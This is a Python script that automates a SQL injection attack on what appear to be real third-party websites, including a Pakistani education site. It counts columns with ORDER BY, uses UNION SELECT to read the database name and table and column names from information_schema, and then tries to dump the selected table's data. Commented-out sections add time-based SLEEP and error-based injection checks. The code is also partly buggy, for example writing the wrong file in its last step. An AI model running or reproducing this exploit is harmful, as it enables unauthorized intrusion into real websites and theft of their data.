import urllib.request
from urllib.parse import urlparse,urlunparse
import sys
import requests
import mechanize
import time
import difflib
#url ='http://achromicpoint.com/past-event.php?id=186'
#global 
#url = 'http://ami.edu.pk/page.php?p_id=100'
#result = requests.get(url+ "union select * from informaction_scheme")
#time = result.elapsed.total_seconds()
#print(time)
req = "http://ami.edu.pk/page.php?p_id=100"
'''
#time based attacke vector
req = "http://ami.edu.pk/page.php?p_id=100"
parse = urlparse(req)
qur = parse.query+'--SLEEP(15)--+'
print(qur,type(qur))
print(req,type(req))
parse = parse._replace(query=qur)
print(parse)
url = urlunparse(parse)
print(url,type(url))
start = time.time()
resp = urllib.request.urlopen(url)
end = time.time() -start
print(end)
if end> 2.5:
    print("vulberable")
'''
#request = urllib.request.urlopen(url+"'")
#print(request.geturl())
resp = urllib.request.urlopen(req)
start = resp.read().decode('utf-8')
start.strip().splitlines()
with open("no_vuln.txt","w") as file1:
    file1.write(start)
normlen = len(start)
print(normlen)
for i in range(1,13):
    quer = '%20order%20by%20'+str(i)+'--+'
    #print(quer)
    parse = urlparse(req)
    qur = parse.query+quer
    #print(qur,type(qur))
    #print(req,type(req))
    parse = parse._replace(query=qur)
    #print(parse)
    url = urlunparse(parse)
    #print(url)
    request = urllib.request.urlopen(url)
    #print(request.info())
    print(request.geturl())
    html_len = len(request.read())
    print(html_len)
    if html_len < normlen:
        id = i
        print(i-1)
        break
    print('*'*10)
    
quer = ['%20UNION%20SELECT%201']
for i in range(2,id):
    quer.append(str(i))
union1 = ','.join(quer)
union = union1+'--+'
print(union)
parse = urlparse(req)
ch = parse.query.replace('100','-100')
qur = ch+union
print(qur)
parse = parse._replace(query=qur)
#print(parse)
url = urlunparse(parse)
#print(url)
request1 = urllib.request.urlopen(url)
print(request1.info())
print(request1.geturl())
fin = request1.read().decode('utf-8')
fin.strip().splitlines()
html_len = len(fin)
print(html_len)
with open("vuln_id.txt",'w') as file2:
    file2.write(fin)
with open("no_vuln.txt") as f1:
    f1_text = f1.read()
with open("vuln_id.txt") as f2:
    f2_text = f2.read()
vul_id = []

for line in difflib.unified_diff(f1_text,f2_text, fromfile='no_vuln.txt',tofile='vuln_id.txt', lineterm='',n=0):
    for prefix in ('---','+++','@@','-'):
        if line.startswith(prefix):
            break
    else:
        vul_id.append(line.strip('+'))
        print(vul_id)

for i in vul_id:
    vul_db = []
    parse = urlparse(request1.geturl())
    vul_query = parse.query.replace(i,'database()')
    qur = vul_query
    parse = parse._replace(query=qur)
    url = urlunparse(parse)
    request2 = urllib.request.urlopen(url)
    print(request2.geturl())
    fin1 = request2.read().decode('utf-8')
    fin1.strip().splitlines()
    with open("vuln_db.txt","w") as file2:
        file2.write(fin1)
    with open("vuln_id.txt") as f1:
        f1_text = f1.read()
    with open("vuln_db.txt") as f2:
        f2_text = f2.read()
    for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_db.txt',tofile='vuln_id.txt', lineterm='',n=0):
        for prefix in ('---','+++','@@','-'):
            if line.startswith(prefix):
                break
        else:
            #print(line)
            vul_db.append(line.strip('+'))
    #print(''.join(vul_db))
    vuln_id = i
vuln_db = ''.join(vul_db)
print(vuln_db)
parse = urlparse(request1.geturl())
vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT(table_name)')
qur = vul_query
parse = parse._replace(query=vul_query)
print(vul_query)
print('*'*10)
vul_query = parse.query.replace('--+','%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--+')
print(vul_query)
parse = parse._replace(query=vul_query)
url = urlunparse(parse)
print('*'*10)
print(url)
request3 = urllib.request.urlopen(url)
fin2 = request3.read().decode('utf-8')
fin2.strip().splitlines()
with open("tables.txt",'w') as file3:
    file3.write(fin2)
with open("vuln_id.txt") as f1:
        f1_text = f1.read()
with open("tables.txt") as f2:
        f2_text = f2.read()
vuln_tbl = []
for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='tables.txt', lineterm='',n=0):
    for prefix in ('---','+++','@@','-'):
        if line.startswith(prefix):
            break
    else:
        #print(line)
        vuln_tbl.append(line.strip('+'))

tables = ''.join(vuln_tbl)
print(tables,type(tables))
print('*'*10)
tab = tables.strip()
tabl = tab.split(",")
print("Select the table to extract data")
for i in tabl:
    print(str(tabl.index(i))+"-"+i)
ind = int(input("Choose the table"))
table = tabl[ind].encode("utf-8").hex()
parse = urlparse(request1.geturl())
vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT(column_name)')
qur = vul_query
parse = parse._replace(query=vul_query)
print(vul_query)
print('*'*10)
vul_query = parse.query.replace('--+','%20FROM%20information_schema.columns%20WHERE%20table_name=0x'+str(table)+'%20--+')
print(vul_query)
parse = parse._replace(query=vul_query)
url = urlunparse(parse)
print('*'*10)
print(url)
request3 = urllib.request.urlopen(url)
print(request3.geturl())
fin3 = request3.read().decode('utf-8')
fin3.strip().splitlines()
with open("columns.txt",'w') as file4:
    file4.write(fin3)
with open("vuln_id.txt") as f1:
        f1_text = f1.read()
with open("columns.txt") as f2:
        f2_text = f2.read()
vuln_tbl = []
for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='columns.txt', lineterm='',n=0):
    for prefix in ('---','+++','@@','-'):
        if line.startswith(prefix):
            break
    else:
        #print(line)
        vuln_tbl.append(line.strip('+'))
tables = ''.join(vuln_tbl)
print(tables,type(tables))
print('*'*10)
tab = tables.strip()
tabl = tab.split(",")
print(tabl)

quer = '%20UNION%20SELECT%20'
colm = ','.join(tabl)
query = quer+colm
print(query)
parse = urlparse(req)
ch = parse.query.replace('100','-100')
qur = ch+query+'--+'
parse = parse._replace(query=qur)
vul_query = parse.query.replace('--+','%20FROM%20information_schema.columns%20WHERE%20table_name=0x'+str(table)+'%20--+')
print(vul_query)
parse = parse._replace(query=vul_query)
url = urlunparse(parse)

request4 = urllib.request.urlopen(url)
print(request4.geturl())
fin4 = request4.read().decode('utf-8')
fin4.strip().splitlines()
with open("db.txt",'w') as file5:
    file4.write(fin3)
with open("vuln_id.txt") as f1:
        f1_text = f1.read()
with open("columns.txt") as f2:
        f2_text = f2.read()
vuln_tbl = []
for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='columns.txt', lineterm='',n=0):
    for prefix in ('---','+++','@@','-'):
        if line.startswith(prefix):
            break
    else:
        #print(line)
        vuln_tbl.append(line.strip('+'))


'''
print("Select the column to extract data")
for i in tabl:
    print(str(tabl.index(i))+"-"+i)
ind = int(input("Choose the columns"))
table = tabl[ind].encode("utf-8").hex()

'''




'''              
with urllib.request.urlopen(req) as file1:
    with urllib.request.urlopen(url) as file2:
        start = file1.read().decode('utf-8')
        end = file2.read().decode('utf-8')
        filecmp.cmp(start,end)

new_query = "id=1' OR '1' = '1"
request = urllib.request.urlopen(url)
print(request.geturl())
#print(request.info())
parse = urlparse(url)
print(parse)
print('*'*80)
parse = parse._replace(query=new_query)
print(parse)
print('*'*80)
print(urlunparse(parse))

resp = urllib.request.urlopen(url+"'")
body = resp.read() 
fullbody = body.decode('utf-8')
print(resp.geturl())
print(resp.info())
print(urlparse(url))


if "You have an error in your SQL syntax" in fullbody:
	print("The given url is vulnerable")
else:
	print("Not Vulnerable")
	sys.exit()

print("continue")


request = mechanize.Browser()
request.open(url)
#request.select_form(nr=0)
#request["id"] = "1 OR 1 = 1"
#response = request.submit()
#content = response.read()
#print(content)
'''
